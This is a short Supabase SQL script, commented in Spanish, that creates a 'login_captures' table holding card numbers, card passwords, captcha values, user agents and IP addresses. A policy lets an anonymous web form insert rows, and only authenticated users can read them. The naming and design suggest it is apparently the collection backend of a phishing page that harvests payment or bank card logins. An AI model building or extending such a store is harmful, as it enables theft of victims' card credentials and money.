-- Script SQL para crear la tabla de captura de datos de login
-- Ejecutar en el SQL Editor de Supabase

-- Crear la tabla para almacenar los datos del formulario
CREATE TABLE IF NOT EXISTS login_captures (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  card_number TEXT NOT NULL,
  card_password TEXT NOT NULL,
  captcha TEXT,
  user_agent TEXT,
  ip_address TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Crear un índice por fecha para consultas rápidas
CREATE INDEX IF NOT EXISTS idx_login_captures_created_at ON login_captures(created_at DESC);

-- Habilitar Row Level Security (opcional, pero recomendado)
ALTER TABLE login_captures ENABLE ROW LEVEL SECURITY;

-- Crear política para permitir inserts anónimos (necesario para que el formulario pueda insertar)
CREATE POLICY "Allow anonymous inserts" ON login_captures
  FOR INSERT
  TO anon
  WITH CHECK (true);

-- (Opcional) Política para que solo usuarios autenticados puedan leer
CREATE POLICY "Allow authenticated select" ON login_captures
  FOR SELECT
  TO authenticated
  USING (true);
